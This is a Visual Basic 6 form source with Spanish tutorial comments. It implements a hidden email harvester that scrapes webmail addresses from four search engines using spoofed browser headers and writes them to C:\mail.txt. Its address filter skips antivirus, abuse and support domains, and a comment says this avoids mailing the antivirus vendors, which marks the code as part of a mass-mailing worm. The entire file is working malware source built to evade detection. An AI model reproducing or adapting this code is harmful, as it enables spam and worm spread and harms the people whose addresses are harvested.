VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Este code conecta a alguno de 4 buscadores recibe los resultados
'busca los correos y los guarda en c:\mail.txt
'Vamos a trabajar los sockets en modo de blokeo, aunque puede
'hacerse en modo de no bloqueo

'api para saber si estamos conectados a internet
Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef IpdwFlags As Long, ByVal dwReserved As Long) As Long

'api para dormir la aplicacion x milisegundos
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

'Declaramos la var del fso aqui para poder usarlo desde cualquier
'parte del form
Dim fso As Object
'/*

Private Sub Form_Load()
On Error Resume Next

'llamamos al fso y creamos c:\mail.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.CreateTextFile("C:\mail.txt")
a.write "MAIL:" & vbCrLf & vbCrLf & vbCrLf
a.Close
'/*

'llamamos al sub para buscar los mails
Call BuscarMails

'salimos
End
End Sub

Private Sub BuscarMails()
On Error Resume Next
'si no hay conexcion a internet salimos
If Not (IState()) Then Exit Sub

'abrimos c:\mail.txt en modo 8 (agregar datos al archivo)
Set a = fso.OpenTextFile("C:\mail.txt", 8)
'/*

'declaramos variables
Dim sr As String, x As Long, ul(4) As String, r(2) As Integer, i As Integer, z As Integer, s As String

'declaramos ReadBuffer como una cadena de 100 espacios
'esta var sera nuestro buffer para recibir los datos
'que nos envie el buscador
Dim ReadBuffer As String * 1000

'llenamos el array ul con las url de los buscadores
ul(0) = "www.google.com"
ul(1) = "search.yahoo.com"
ul(2) = "www.altavista.com"
ul(3) = "search.lycos.com"

'iniciamos el modo aleatorio
Randomize
'obtenemos en r(0) un valor aleatorio de 0 a 3
r(0) = Int(Rnd * 4)
'obtenemos en r(1) un valor aleatorio de 0 a 89
r(1) = Int(Rnd * 90)

'iniciamos el winsock, si hay error salimos
If Not (StartWinsock()) Then Exit Sub

'ahora iniciamos un for del valor de r(1) a r(1)+10
'para hacer las 10 consultas al buscador, como cada
'consulta da 10 resultados, obtendremos 100
'el valor maximo de r(1) puede ser 89 que +10 seria
'99 ya que los buscadores no nos dan resultados por
'arriba de 1000, al valor de i se le multiplicara por 10
'con lo que seria maximo 89+10=99 -> 99*10=990
For i = r(1) To (r(1) + 10)
'un doevents

'conectamos con la url del buscador, indicado por el indice
'de ul() que indique r(0), y obtenemos en sk el "handle"
'del socket
sk = ConnectSock(ul(r(0)))

'if el valor es -1 (INVALID_SOCKET) hubo error al conectar
'y salimos del for
If sk < 0 Then Exit For

'pasamos a GetSearchUrl el valor de r(0) y el contador i
'y obtenemos en s la url de busqueda que enviaremos
s = GetSearchUrl(r(0), i)

'enviamos la solicitud HTTP Get
'pasamos a SendData el handle del socket y pasando a GetHTTP
'la url del buscador en el indice de ul() indicado por r(0)
'y la url de busqueda que tenemos en s
'nos devuelve la solicitud HTTP Get con las cabeceras y todo
'la cual pasamos como 2° argumento a SendData, enviamos al
'final 2 vbCrLf porque en el protocolo http, asi debe terminar
'una peticion
Call SendData(sk, GetHTTP(ul(r(0)), s) & vbCrLf & vbCrLf)

't = al valor de Timer
t = Timer

'iniciamos un Do mientras x > 0
Do
DoEvents

'llamamos a recv para recibir los datos que nos envia el
'buscador, pasamos el handle del socket, nuestro Buffer y el
'tamaño del buffer, como 4° argumento van opciones que no usamos
'ponemos 0, nos devuelve en x el numero de bytes recibidos
'mientras x>0 hay más bytes que recibir, cuando ya no haya
'x sera = 0 ó si se vence el timeout dara -1 y saldremos
'del Do
x = recv(sk, ByVal ReadBuffer, 1000, 0)

'vamos acumulando lo recibido en sr, como no siempre
'se llenan los 1000 espacios del buffer, solo tomamos
'tantos caracteres como indica x que fueron recibidos
'(1 caracter = 1 byte)
sr = sr & Left$(ReadBuffer, x)

'si por alguna razon x no es < a 0 despues de 30 segundos
'hay error y salimos
'esto funciona si el error no esta en recv
'porque como estamos trabajando los sockets en modo de bloqueo
'si el buscador por alguna razon no nos envia o no recibimos
'la info, el socket se quedaria bloqueado esperando que le
'lleque la info y hay si nos fregariamos, por eso en la
'funcion que conecta el socket(en el modulo), establecemos un
'timeout de 30 seg, para la funcion recv, si no recibe datos
'en ese tiempo regresa -1 (SOCKET_ERROR)
If Format(Timer - t, "0.00") > 30 Then Exit Do
Loop While (x > 0)

'cerramos el socket
Call closesocket(sk)

'eliminamos algunos caracteres y cadenas que estorban
'reemplazamos otras
sr = Replace(sr, "b>", "")
sr = Replace(sr, "gt;", "")
sr = Replace(sr, "lt;", "")
sr = Replace(sr, "size", "")
sr = Replace(sr, "vbcrlf", " ")

sr = Replace(sr, "@ ", "@")
sr = Replace(sr, " @", "@")
sr = Replace(sr, " @ ", "@")
sr = Replace(sr, " (a) ", "@")
sr = Replace(sr, " [a] ", "@")
sr = Replace(sr, " (.) ", ".")
sr = Replace(sr, " [.] ", ".")
sr = Replace(sr, " (at) ", "@")
sr = Replace(sr, " [at] ", "@")
sr = Replace(sr, "(a)", "@")
sr = Replace(sr, "[a]", "@")
sr = Replace(sr, "(.)", ".")
sr = Replace(sr, "[.]", ".")
sr = Replace(sr, "(at)", "@")
sr = Replace(sr, "[at]", "@")

'dividimos la cadena sr en cada espacio y almacenamos las partes
'en el array ar
ar = Split(sr, " ")

'iniciamos un for de 0 al mayor indice de ar
For z = 0 To UBound(ar)

'si el indice de ar indicado por z contiene @
'lo analizamos a ver si es un correo
If InStr(ar(z), "@") <> 0 Then

'convertimos a cadena con cstr(), pasamos a smail() para quitar
'la basura del correo si la ubiera, luego pasamos a IsMail para
'ver si es un correo valido
 If IsMail(smail(CStr(ar(z)))) Then
 
 '*/escribimos el correo en C:\mail.txt
  a.write smail(CStr(ar(z))) & vbCrLf
 '/*
  
 End If
End If
Next

'vaciamos sr (importante)
sr = ""

'dormimos 5 segundos
Sleep (5000)
Next

'cerramos el archivo c:\mail.txt
a.Close
'/*

'terminamos nuestra instancia con el winsock
Call EndWinsock
End Sub

'elimina la basura o caracteres que no debe contener un
'mail y devuelve o trata de devolver un email valido
Private Function smail(mail As String) As String
On Error Resume Next
Dim m As String, i As Integer

'iniciamos un for para analizar caracter por caracter del mail
For i = 1 To Len(mail)
'obtiene el codigo ascii del caracter
 m = Asc(Mid(mail, i, 1))
'como los caracteres permitidos en un mail son letras minusculas
'o mayusculas, numeros,  rayita ( _ ) , arroba y punto:
'a-z en ascii de 97 a 122
'A-Z en ascii de 65 a 90
'0-9 en ascii de 48 a 57
'_ en ascii 95
'@ en ascii 64
'. en ascii 46
'si algun caracter esta fuera de ese rango ascii no lo
'añadimos a smail
 If ((m >= 97) And (m <= 122)) Or ((m >= 65) And (m <= 90)) Or ((m >= 48) And (m <= 57)) Or (m = 95) Or (m = 64) Or (m = 46) Then
 smail = smail & LCase(Chr(m))
 End If
Next

'esto es en caso de que el mail este asi:
'user@dominio.combdyeh ,el email es valido
'solo tiene basura despues del .com, pero esa
'basura son letras, entonces

i = 0

'si el mail contiene .com. o .net. o .org. o alguna de estas
'terminaciones que vemos, es del tipo user@dominio.xxx.yy
'donde xxx es com, net, org, edu, mil ó gob.
'yy son 2 letras que indican el pais, como: mx, pe, br, cl
'entonces obtenemos en i la posicion de .xxx. y devolvemos
'el mail desde el caracter 1 al i+6 (le sumamos 6 para tomar
'xxx.yy que son 6 caracteres, el punto inicial de .xxx. ya no
'lo contamos, porque esta en la posicion indicada en i)
'con esto eliminamos lo que haya despues del .xxx.yy
i = InStr(smail, ".com.")
 If i = 0 Then i = InStr(smail, ".net.")
 If i = 0 Then i = InStr(smail, ".org.")
 If i = 0 Then i = InStr(smail, ".edu.")
 If i = 0 Then i = InStr(smail, ".mil.")
 If i = 0 Then i = InStr(smail, ".gob.")
If i <> 0 Then smail = Mid(smail, 1, i + 6)

'si no contenia ninguna de esas cadenas y i sigue = 0
If i = 0 Then
'tal vez contenga .com .net .org etc
'si las contiene es mail del tipo user@dominio.xxx
 If i = 0 Then i = InStr(smail, ".com")
 If i = 0 Then i = InStr(smail, ".net")
 If i = 0 Then i = InStr(smail, ".org")
 If i = 0 Then i = InStr(smail, ".edu")
 If i = 0 Then i = InStr(smail, ".mil")
 If i = 0 Then i = InStr(smail, ".gob")
'entonces obtenemos en i la posicion de .xxx y devolvemos
'el mail desde el caracter 1 al i+3 (le sumamos 3 para tomar
'xxx que son 3 caracteres, el punto inicial de .xxx ya no
'lo contamos, porque esta en la posicion indicada en i)
'con esto eliminamos lo que haya despues del .xxx
If i <> 0 Then smail = Mid(smail, 1, i + 3)
End If

'si no contiene tampoco ninguna de esas cadenas y i sigue = 0
'entonces el mail puede ser del tipo user@dominio.yy
'donde yy son 2 letras que indican el pais, como:
'user@yahoo.es
If i = 0 Then
'entonces obtenemos en i la posicion de .yy  y devolvemos
'el mail desde el caracter 1 al i+2 (le sumamos 2 para tomar
'yy que son 2 caracteres, el punto inicial de .yy ya no
'lo contamos, porque esta en la posicion indicada en i)
'con esto eliminamos lo que haya despues del .yy
 i = InStr(smail, ".")
If i <> 0 Then smail = Mid(smail, 1, i + 2)
End If


'esto es por si el mail termina en puntos:
'user@dominio.com..   ó   user@dominio.com...

'definimos una etiqueta para el goto
EliminaPunto:

'si el ultimo caracter es un .
If Right(smail, 1) = "." Then
'eliminamos el ultimo caracter
smail = Left$(smail, Len(smail) - 1)
'regresamos a EliminaPunto para ver si hay más puntos
'al final del mail
GoTo EliminaPunto
End If

End Function

'si el mail es valido devuelve true, sino false
'para determinar la validez busca caracteres que no debieran
'estar en un mail y tambien si ese mail pertenece a algun domi
'nio de antivirus (no vaya a ser que nos enviemos a los avs
'nosotros mismos)
'tambien verifica la existencia de la @ y el . ,como su  posicion
'ya que en un mail normal la @ debe estar antes que el .
Private Function IsMail(ML) As Boolean
On Error Resume Next: Dim z(65) As String, X1 As Integer, X2 As Integer
If Len(ML) <= 5 Then IsMail = False: Exit Function
If Right(ML, 1) = "." Then IsMail = False: Exit Function
z(0) = "/": z(1) = "\": z(2) = "?": z(3) = "="
z(4) = ">"
z(5) = "<": z(6) = Chr(34): z(7) = ";": z(8) = ","
z(9) = Chr(37): z(10) = "¡": z(11) = "¿": z(12) = ")"
z(13) = "(": z(14) = "virus": z(15) = Chr(32): z(16) = ":"
z(17) = "[": z(18) = "]": z(19) = ".."
z(20) = "master": z(21) = "persys": z(22) = "perant": z(23) = "virus": z(24) = "abuse"
z(25) = "report": z(26) = "panda": z(27) = "symantec": z(28) = "trend": z(29) = "avp"
z(30) = "kasp": z(31) = "nod": z(32) = "support": z(33) = "admin": z(34) = "foo"
z(35) = "iana": z(36) = "messagelab": z(37) = "microsoft": z(38) = "msn": z(39) = "anyone"
z(40) = "bug": z(41) = "f-secur": z(42) = "free-av": z(43) = "google": z(44) = "help"
z(45) = "info": z(46) = "linux": z(47) = "soporte": z(48) = "nobody": z(49) = "noone"
z(50) = "noreply": z(51) = "rating": z(52) = "root": z(53) = "samples": z(54) = "sopho"
z(55) = "spam": z(56) = "unix": z(57) = "upd": z(58) = "winrar": z(59) = "winzip"
z(60) = "value": z(61) = "quot": z(62) = "for@": z(63) = "search": z(64) = "bsqueda"

For k = 0 To UBound(z) - 1
If InStr(LCase(ML), z(k)) <> 0 Then
IsMail = False
Exit Function
End If
Next

X1 = InStr(ML, "@"): X2 = InStr(ML, ".")
If (X1 > 1) And (X2 <> 0) And (X1 < X2) Then IsMail = True Else IsMail = False
End Function

'si hay conexcion a internet devuelve true, sino false
Private Function IState() As Boolean
On Error Resume Next: IState = IIf(InternetGetConnectedState(0&, 0&) <> 0, True, False)
End Function

'pasandole la url del buscador al que nos conectamos y la url de
'busqueda nos devuelve una peticion HTTP Get, construye la pe-
'ticion usando diferentes partes aleatoriamente
Private Function GetHTTP(URL As String, GtUrl As String) As String
On Error Resume Next
Randomize
GetHTTP = "GET " & GtUrl & " HTTP/1.0" & vbCrLf
Ar1 = Array("image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, application/x-shockwave-flash, */*", "*/*")
GetHTTP = GetHTTP & "Accept: " & Ar1(Int(Rnd * (UBound(Ar1) + 1))) & vbCrLf
Ar2 = Array("es-mx", "de", "ca", "pl", "en", "en-us", "en-gb", "fr", "nl", "ja", "es-es", "es", "es-ar", "es-co")
GetHTTP = GetHTTP & "Accept-Language: " & Ar2(Int(Rnd * (UBound(Ar2) + 1))) & vbCrLf
Ar4 = Array("Mozilla/4.0 (", " Mozilla/4.4 (", "Mozilla/5.0 (", "Mozilla/4.8 (", "Mozilla/2.0 (", "Mozilla/3.0 (", "Opera/6.05 (", "Opera/6.03 (", "Opera/7.20 (")
Ar5 = Array("compatible; MSIE 6.0; ", "compatible; MSIE 5.01; ", "compatible; MSIE 5.0; ", "Windows; U; ", "compatible; MSIE 5.21; ", "Macintosh; U; ", "compatible; Konqueror/3; ", "Windows XP; ", "Windows 98; ", "Windows 2000; ", "Windows NT 5.0; ", "Windows NT 5.1; ", "Linux 2.4.18-4GB i686; ", "compatible; MSIE 3.0; ", "compatible; StarOffice/5.2; ")
Ar6 = Array("Windows 98)", "Windows XP)", "Windows 98; Win 9x 4.90)", "Windows NT 5.1)", "Windows NT 5.0)", "Windows 95)", "WinNT4.0)", "Mac_PowerPC)", "PPC)", "Linux)", "U) [de]", "U) [pl]", "U) [es]", "U) [en]", "U) [fr]", "Windows 3.1)", "Win32)")
GetHTTP = GetHTTP & "User-Agent: " & Ar4(Int(Rnd * (UBound(Ar4) + 1))) & Ar5(Int(Rnd * (UBound(Ar5) + 1))) & Ar6(Int(Rnd * (UBound(Ar6) + 1))) & vbCrLf
Ar7 = Array(URL & ":80", URL)
GetHTTP = GetHTTP & "Host: " & Ar7(Int(Rnd * (UBound(Ar7) + 1)))
End Function

'pasandole como 1° argumento un valor entre 0 a 3 y como 2°
'argumento un valor entre 0 y 99 devuelve una url de busqueda
'valida para el buscador indicado
Private Function GetSearchUrl(n As Integer, i As Integer) As String
'sm array de 12 indices
Dim sm(12) As String, y As Integer
'obtenemos en y un valor aleatorio entre 0 y 11
Randomize: y = Int(Rnd * 12)

'llenamos el array con las posibles cadenas que buscaremos
sm(0) = "hotmail.com"
sm(1) = "yahoo.com.mx"
sm(2) = "yahoo.com.ar"
sm(3) = "yahoo.es"
sm(4) = "latinmail.com"
sm(5) = "mixmail.com"
sm(6) = "terra.com.pe"
sm(7) = "terra.com.mx"
sm(8) = "terra.com.ar"
sm(9) = "terra.com.br"
sm(9) = "terramail.com"
sm(10) = "aol.com"
sm(11) = "gmail.com"

'evaluamos n con un case
'si es 0 estamos conectamos a google y devolvemos una url de
'busqueda de google
'si es 1 estamos conectamos a yahoo y devolvemos una url de
'busqueda de yahoo
'si es 2 estamos conectamos a altavista y devolvemos una url de
'busqueda de altavista
'si es 0 estamos conectamos a lycos y devolvemos una url de
'busqueda de lycos

'ver que al devolver la url de busqueda la componemos usando
'el valor del indice de sm() indicado por y (pa ver que
'buscamos) y el valor de i multiplicado por 10 (pa ver
'que numero de resultado queremos)
Select Case n
Case 0: GetSearchUrl = "/search?q=%40" & sm(y) & "&hl=es&lr=&start=" & CStr(i * 10) & "&sa=N"
Case 1: GetSearchUrl = "/search?p=%40" & sm(y) & "&toggle=1&ei=UTF-8&fr=FP-tab-web-t&b=" & CStr(i * 10)
Case 2: GetSearchUrl = "/web/results?itag=ody&q=@" & sm(y) & "&kgs=0&kls=0&stq=" & CStr(i * 10)
Case 3: sm(y) = Replace(sm(y), ".", "%2E"): GetSearchUrl = "/default.asp?query=%40" & sm(y) & "&first=" & CStr(i * 10) & "&pmore=more"
End Select
End Function
